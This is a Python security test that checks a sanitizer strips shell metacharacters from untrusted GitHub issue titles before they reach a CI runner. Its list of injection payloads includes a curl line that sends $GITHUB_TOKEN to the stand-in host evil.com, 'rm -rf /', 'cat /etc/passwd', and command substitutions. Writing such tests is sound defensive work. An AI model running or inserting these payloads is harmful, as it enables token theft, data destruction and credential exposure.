#!/usr/bin/env python3
"""darkfloor — the SECURITY test (2026-08-10 review round 3, blocking RCE).

A kb-door issue title is untrusted CI input. sanitize() must strip every
shell metacharacter so no title can carry a command into the dark-floor
runner. Also asserts the subject picker's precedence + safe fallbacks."""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from kbworld.darkfloor import sanitize, pick, SEEDS       # noqa: E402


def main():
    # the exact payloads the reviewer named + the classic vectors
    ATTACKS = [
        "home`id`;curl evil.com?d=$GITHUB_TOKEN`espresso",
        'home"espresso',
        "$(rm -rf /)",
        "a; echo pwned",
        "x`whoami`",
        "sub\nject\nSECRET=leak",
        "'; cat /etc/passwd; '",
        "back\\slash & pipe | amp",
    ]
    bad = set('`$";|&\n\\;()<>')
    for a in ATTACKS:
        out = sanitize(a)
        assert not (set(out) & bad), (a, out)
        assert out == out.strip() and "  " not in out
        assert len(out) <= 80
        assert out, a                         # never empty (falls back)
    print(f"  sanitize: {len(ATTACKS)} injection payloads neutralized — "
          "output is [A-Za-z0-9 _-] only, never empty ✓")

    # a legit door subject survives readably
    assert sanitize("kb-door already stripped: home espresso") == \
        "kb-door already stripped home espresso"
    assert sanitize("Wine Tasting 101") == "Wine Tasting 101"
    assert sanitize("   ") == SEEDS[0]        # empty → seed, never degenerate
    print("  sanitize: legit subjects pass through readable; empty → seed ✓")

    # precedence: a kb-door issue outranks seeds, and its title is sanitized
    # end-to-end (monkeypatch the gh boundary to return a malicious title)
    import kbworld.darkfloor as df
    closed = []
    def fake_gh(*a):
        if "list" in a:
            return "42\thome`evil`espresso"          # number\ttitle
        if "close" in a:
            closed.append(a)
            return ""
        return ""
    df._gh = fake_gh
    got = pick(state_root="/nonexistent", repo="x/y")
    assert not (set(got) & bad), got
    assert "home" in got and "espresso" in got
    assert closed and "42" in closed[0]                 # door consumed
    print(f"  pick: kb-door title sanitized end-to-end → {got!r}; door "
          "consumed (closed) ✓")

    # no doors, no state → a safe seed
    df._gh = lambda *a: ""
    got2 = pick(state_root="/nonexistent", repo="x/y")
    assert got2 in [sanitize(x) for x in SEEDS]
    print(f"  pick: empty floor → seed {got2!r} ✓")


if __name__ == "__main__":
    main()
    print("DARKFLOOR PASS — untrusted issue titles cannot inject into the "
          "CI runner: sanitized at the source (and passed via $GITHUB_ENV, "
          "never ${{ }}, in the workflow).")
